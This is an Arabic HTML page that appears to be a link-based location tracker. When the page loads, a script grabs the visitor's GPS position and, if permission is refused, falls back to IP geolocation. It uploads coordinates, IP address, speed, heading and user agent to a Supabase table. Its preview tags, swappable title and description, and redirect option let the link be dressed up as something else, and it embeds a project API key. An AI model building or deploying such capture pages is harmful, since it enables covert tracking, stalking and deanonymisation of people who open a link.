<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>مشاركة موقعي</title>

  <!-- OG ثابتة (لللمعاينة). يمكن وضع صورة عامة للمشروع -->
  <meta property="og:title" content="شارك موقعك الآن 📍" />
  <meta property="og:description" content="قد يختلف السلوك حسب الإعدادات المرفقة." />
  <meta property="og:image" content="https://img.youm7.com/large/201704190111181118.jpg" />
  <meta property="og:url" content="https://xb7rbx.github.io/X/capture.html" />
  <meta property="og:type" content="website" />
  <meta name="twitter:card" content="summary_large_image" />

  <meta http-equiv="Content-Security-Policy"
        content="default-src 'self'; img-src * data:; script-src 'self' https://cdn.jsdelivr.net https://unpkg.com; connect-src 'self' https://*.supabase.co https://ipwho.is; style-src 'self' 'unsafe-inline'; frame-ancestors 'none'; upgrade-insecure-requests">

  <style>
    body{font-family:system-ui,-apple-system,Segoe UI;min-height:100svh;display:grid;place-items:center;padding:24px;line-height:1.7;background:#fafafa}
    .card{max-width:560px;width:100%;border:1px solid #e5e7eb;border-radius:12px;padding:22px;background:#fff;box-shadow:0 6px 20px rgba(0,0,0,.06)}
    .muted{color:#6b7280}.ok{color:#047857;font-weight:700}.err{color:#b91c1c;font-weight:700}
    progress{width:100%}.hidden{display:none}
  </style>
</head>
<body>
  <div class="card">
    <h1 id="title">📍 تحديد موقعك…</h1>
    <p id="desc" class="muted">سنحاول GPS وإن رُفض الإذن نستخدم IP.</p>
    <progress id="bar" max="100" value="10"></progress>
    <p id="status" class="muted">جارِ التحضير…</p>
    <button id="retry" class="hidden">إعادة المحاولة</button>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
  <script>
    // Supabase
    const PROJECT_URL = 'https://weaiftikalbujuecfuhf.supabase.co';
    const ANON_KEY    = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6IndlYWlmdGlrYWxidWp1ZWNmdWhmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTYzOTU2MzAsImV4cCI6MjA3MTk3MTYzMH0.kxiytsgnkEOim_zUD49zgVp7rxr3nHAVHFb0Jq9dijk';
    const TABLE_PINGS = 'pings';
    const TABLE_CFG   = 'configs';
    const supabase = window.supabase.createClient(PROJECT_URL, ANON_KEY);

    // عناصر
    const hTitle = document.getElementById('title');
    const pDesc  = document.getElementById('desc');
    const bar = document.getElementById('bar');
    const statusEl = document.getElementById('status');
    const retryBtn = document.getElementById('retry');

    // قراءة cfg من الرابط
    const qs = new URLSearchParams(location.search);
    const cfgId = qs.get('cfg') || null;

    // sanitize note من الرابط + fixed_note من الإعدادات
    function sanitizeNote(s){
      if (s == null) return null;
      s = s.slice(0, 120);
      const ok = /^[\u0600-\u06FF\w\s\-_.@#]+$/u;
      return ok.test(s) ? s : null;
    }
    const noteFromQS = sanitizeNote(qs.get('note'));

    function setStatus(t, cls){ statusEl.textContent = t; statusEl.className = cls || 'muted'; }

    // IP fallback — ipwho.is
    async function ipGeo(){
      const r = await fetch('https://ipwho.is/', { cache:'no-store' });
      if (!r.ok) throw new Error('IP request failed');
      const j = await r.json();
      if (!j.success) throw new Error('IP geolocation failed');
      return { lat:j.latitude ?? null, lng:j.longitude ?? null, ip:j.ip ?? null, accuracy:5000, method:'ip' };
    }

    // GPS
    function gpsGeo(timeoutMs = 15000){
      return new Promise((resolve,reject)=>{
        if (!('geolocation' in navigator)) return reject(new Error('Geolocation unsupported'));
        const opts = { enableHighAccuracy:true, timeout:timeoutMs, maximumAge:0 };
        navigator.geolocation.getCurrentPosition(
          pos => {
            const c = pos.coords;
            resolve({
              lat:c.latitude, lng:c.longitude,
              accuracy:c.accuracy ?? null,
              speed:c.speed ?? null, heading:c.heading ?? null,
              method:'gps'
            });
          },
          err => reject(err),
          opts
        );
      });
    }

    async function savePing(row){
      const { error } = await supabase.from(TABLE_PINGS).insert([row]);
      if (error) throw error;
    }

    async function fetchConfig(id){
      if (!id) return null;
      const { data, error } = await supabase.from(TABLE_CFG).select('*').eq('id', id).single();
      if (error) return null;
      return data;
    }

    async function start(){
      try{
        bar.value = 20; setStatus('تحميل الإعدادات…');

        // جلب الإعدادات وتطبيق النصوص
        const cfg = await fetchConfig(cfgId);
        if (cfg) {
          if (cfg.title) hTitle.textContent = cfg.title;
          if (cfg.description) pDesc.textContent = cfg.description;
        }

        const fixed_note = cfg?.fixed_note || null;
        const require_gps = !!cfg?.require_gps;
        const allow_ip_fallback = cfg?.allow_ip_fallback !== false; // افتراضي true
        const redirect_path = cfg?.redirect_path || null;

        const ua = navigator.userAgent;
        let result = null;

        // منطق الالتقاط
        if (require_gps) {
          setStatus('محاولة GPS بدقة عالية…'); bar.value = 40;
          result = await gpsGeo(15000);
        } else {
          // نحاول GPS أولاً، وإن فشل نرجع IP إن مسموح
          try {
            setStatus('محاولة GPS بدقة عالية…'); bar.value = 40;
            result = await gpsGeo(15000);
          } catch {
            if (!allow_ip_fallback) throw new Error('تم رفض GPS وIP fallback غير مسموح');
            setStatus('تعذّر GPS، نستخدم IP تقريبي…'); bar.value = 70;
            result = await ipGeo();
          }
        }

        // احصل IP إن ما جاش من GPS
        let ip = result.ip || null;
        if (!ip) {
          try {
            const rr = await fetch('https://ipwho.is/', {cache:'no-store'});
            const jj = await rr.json();
            if (jj && jj.ip) ip = jj.ip;
          } catch {}
        }

        // صَغ الملاحظة النهائية
        let finalNote = fixed_note || noteFromQS || null;

        await savePing({
          lat: result.lat, lng: result.lng, accuracy: result.accuracy,
          ip, ua, note: finalNote,
          speed: result.speed ?? null, heading: result.heading ?? null,
          device_info: ua
        });

        bar.value = 100;
        setStatus(result.method === 'gps' ? 'تم الحفظ بدقة GPS ✅' : 'تم الحفظ (تقريبي عبر IP) ✅', 'ok');

        // تطبيق redirect من الإعدادات فقط لمسارات داخلية
        if (redirect_path && redirect_path.startsWith('/') && !redirect_path.startsWith('//')) {
          setTimeout(()=>location.assign(redirect_path), 800);
        }
      } catch(e){
        setStatus('خطأ: '+e.message, 'err');
        retryBtn.classList.remove('hidden');
      }
    }

    document.getElementById('retry').addEventListener('click', ()=>{
      retryBtn.classList.add('hidden');
      setStatus('إعادة المحاولة…'); bar.value = 10;
      start();
    });

    start();
  </script>
</body>
</html>
